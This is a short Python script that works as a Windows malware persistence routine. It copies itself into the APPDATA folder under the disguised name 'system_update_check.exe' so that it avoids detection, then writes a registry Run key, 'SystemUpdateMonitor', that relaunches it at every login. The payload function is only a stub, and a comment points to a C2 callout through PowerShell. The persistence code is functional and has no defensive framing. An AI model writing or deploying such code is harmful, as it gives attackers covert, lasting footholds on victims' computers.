import os
import shutil
import subprocess
import winreg as reg

# 1. Obfuscation: Define a dummy payload path
# In a real scenario, this would be a secondary binary or script
payload_name = "system_update_check.exe"
destination = os.path.join(os.environ['APPDATA'], payload_name)

def establish_persistence():
    """
    Adds the payload to the Windows Registry 'Run' key.
    This ensures the script executes on every user login.
    """
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(key, "SystemUpdateMonitor", 0, reg.REG_SZ, destination)
        reg.CloseKey(key)
        print("[+] Persistence established in Registry.")
    except Exception as e:
        print(f"[-] Failed to set persistence: {e}")

def execute_payload():
    """
    Simulates the execution of a background task.
    """
    # This could be replaced with a command to reach out to a C2 server
    # e.g., subprocess.run(["powershell", "-c", "Invoke-WebRequest..."])
    print("[+] Payload routine running in background...")

if __name__ == "__main__":
    # Copy file to a hidden directory to avoid immediate detection
    if not os.path.exists(destination):
        shutil.copy(os.path.abspath(__file__), destination)
    
    establish_persistence()
    execute_payload()